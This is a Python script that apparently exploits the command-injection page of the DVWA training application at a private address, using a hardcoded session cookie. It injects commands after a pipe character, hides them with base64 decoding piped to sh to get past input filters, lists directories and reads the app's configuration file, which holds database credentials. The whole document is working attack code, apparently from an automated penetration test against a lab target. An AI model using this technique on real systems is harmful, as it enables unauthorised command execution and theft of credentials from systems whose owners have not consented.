import re, json, base64
import urllib.request as ureq

BASE = "http://10.31.0.87:3000"
CK = "PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed; security=high"
op = ureq.build_opener()

def qp(s):
    out = []
    for c in s.encode():
        if (48 <= c <= 57) or (65 <= c <= 90) or (97 <= c <= 122) or c in (45, 46, 95, 126):
            out.append(chr(c))
        else:
            out.append('%%%02X' % c)
    return ''.join(out)

def fetch(path, data=None):
    req = ureq.Request(BASE + path, data=data)
    req.add_header('User-Agent', 'AEGIS-VAPT/1.0')
    req.add_header('Cookie', CK)
    try:
        resp = op.open(req)
    except BaseException as e:
        resp = e
    return resp.read().decode('utf-8', 'replace')

def rce(cmd):
    data = ("ip=" + qp("localhost|" + cmd) + "&Submit=Submit").encode()
    b = fetch("/vulnerabilities/exec/", data)
    m = re.findall(r"<pre>(.*?)</pre>", b, re.S)
    return m[-1].strip() if m else ""

def sh(cmd):
    enc = base64.b64encode(cmd.encode()).decode()
    return rce("echo " + enc + "|base64 -d|sh")

# probe palliatives
print("ls parent:\n", rce("ls ../../"))
print("\ncat dist via b64:\n", sh("cat ../../config/config.inc.php.dist")[:1200])
